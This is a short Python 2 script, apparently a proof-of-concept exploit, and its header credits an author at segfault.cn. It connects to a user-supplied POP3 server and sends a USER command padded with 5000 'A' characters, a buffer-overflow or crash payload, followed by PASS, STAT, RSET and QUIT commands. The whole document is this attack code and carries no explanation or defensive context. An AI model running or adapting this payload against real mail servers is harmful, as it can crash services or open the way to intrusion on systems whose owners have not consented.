ode by OYXin
#oyxin_at_segfault.cn
import socket
import sys
import getopt


def usage():
    print "Usage: foxserver.py -h host -p port"
    sys.exit(0)

if __name__ == '__main__':

    try:
        opts, args = getopt.getopt(sys.argv[1:], "h:p:")
    except getopt.GetoptError, msg:
        print msg
        usage()

    for o,a in opts:
        if o in ["-h"]:
            host = a
        if o in ["-p"]:
            port = int(a)

    evilbuf =  "USER " + "A"*5000 + "\r\n"
    evilbuf2 = "PASS oyxin\r\n"
    evilbuf2 += "STAT\r\n"
    evilbuf2 += "RSET\r\n"
    evilbuf2 += "QUIT\r\n"

    try:
        sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sockfd.connect((host, port))
        recvbuf = sockfd.recv(1024)
        print `recvbuf`
        sockfd.send(evilbuf)
        recvbuf = sockfd.recv(1024)
        print `recvbuf`
        sockfd.send(evilbuf2)
    except socket.error, msg:
        print msg

    sockfd.close()

